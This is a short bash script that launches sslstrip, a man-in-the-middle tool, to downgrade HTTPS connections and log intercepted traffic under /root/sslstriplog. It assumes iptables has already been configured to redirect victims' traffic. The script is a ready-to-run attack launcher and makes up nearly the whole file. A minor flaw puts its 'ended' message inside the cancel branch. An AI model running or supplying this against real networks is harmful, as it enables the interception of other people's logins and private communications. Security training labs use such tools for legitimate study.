#! /bin/bash
# start sslstrip

read -r -p "Are you ready to start SSLStrip - iptables configured? [y/N] " response
if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
then
	echo starting sslstrip…
	echo Enter filename
	read -p 'Filename: ' filevar
	sslstrip -a -f -l 10000 -w /root/sslstriplog/$filevar
else
    echo sslstrip cancelled
echo sslstriping ended
fi
